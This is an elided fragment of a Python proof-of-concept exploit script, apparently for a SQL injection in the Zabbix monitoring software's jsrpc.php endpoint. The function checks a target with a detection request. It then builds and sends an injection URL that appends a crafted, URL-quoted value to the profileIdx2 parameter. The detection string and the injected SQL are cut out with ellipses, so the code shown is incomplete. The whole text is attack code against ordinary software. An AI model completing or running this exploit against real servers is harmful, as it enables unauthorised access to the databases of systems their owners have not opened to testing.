...
def poc(url):
    ...
    try:
        response = urllib.request.urlopen(url + payload_deteck, timeout=10).read()
        ...
        if key_reg.findall(response):
            payload_inject = url + "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib.parse.quote(
            ...
            try:
                response = urllib.request.urlopen(payload_inject, timeout=10).read()
            except Exception as msg:
                # print msg
                pass
            else:
